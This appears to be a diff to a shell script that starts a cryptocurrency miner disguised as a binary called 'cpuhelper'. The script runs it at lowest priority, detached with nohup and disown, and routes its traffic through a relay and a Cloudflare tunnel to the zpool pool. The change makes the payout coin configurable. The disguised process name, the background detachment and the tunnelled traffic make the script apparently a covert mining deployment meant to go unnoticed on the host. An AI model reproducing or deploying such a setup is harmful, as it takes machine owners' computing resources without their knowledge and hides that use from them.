@@ -20,6 +20,7 @@ WALLET="${WALLET:-3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLyy}"
 sed -i "s/3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLyy/$WALLET/g" config.json
 
 ALGO=$(python3 -c "import json;print(json.load(open('config.json'))['algo'])")
+PASS=$(python3 -c "import json;print(json.load(open('config.json'))['pass'])" 2>/dev/null || echo "c=LTC")
 
 echo "==> iniciando relay (HTTP->HTTPS via Cloudflare tunnel, porta 443)..."
 for i in 1 2 3; do
@@ -42,9 +43,10 @@ fi
 echo "==> relay pid: $(cat relay.pid)"
 
 echo "==> miner: $ALGO -> 127.0.0.1:33111 (via relay) -> tunnel -> pcserver -> zpool"
+echo "==> payout: $PASS"
 echo "==> iniciando cpuhelper com nice +19..."
 export LD_LIBRARY_PATH="$(pwd)/libs:$LD_LIBRARY_PATH"
-nohup nice -n 19 ./cpuhelper -a $ALGO -o stretum+tcp://127.0.0.1:33111 -u $WALLET -p=c=BTC -t 1 --retry-pause=15 --timeout=300 > miner.log 2>&1 &
+nohup nice -n 19 ./cpuhelper -a $ALGO -o stretum+tcp://127.0.0.1:33111 -u $WALLET -p=$PASS -t 1 --retry-pause=15 --timeout=300 > miner.log 2>&1 &
 disown
 echo $! > miner.pid
 echo "==> miner pid: $(cat miner.pid)"
